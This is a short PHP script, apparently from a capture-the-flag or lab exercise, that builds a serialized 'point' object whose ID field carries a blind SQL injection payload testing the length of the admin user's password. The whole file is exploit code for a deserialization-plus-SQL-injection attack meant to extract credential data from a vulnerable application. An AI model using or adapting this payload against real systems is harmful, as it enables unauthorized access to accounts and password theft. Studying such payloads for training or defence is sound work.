<?php
class point {
    public $x;
    public $y;
    public $ID;

    public function __construct($x, $y, $ID) {
        $this->x = $x;
        $this->y = $y;
        $this->ID = $ID;
    }
}

$object = new point('0','0',"3306859 OR (LENGTH((SELECT password FROM user WHERE username = 'admin'))) = 32");
$serialized = serialize($object);
echo $serialized;
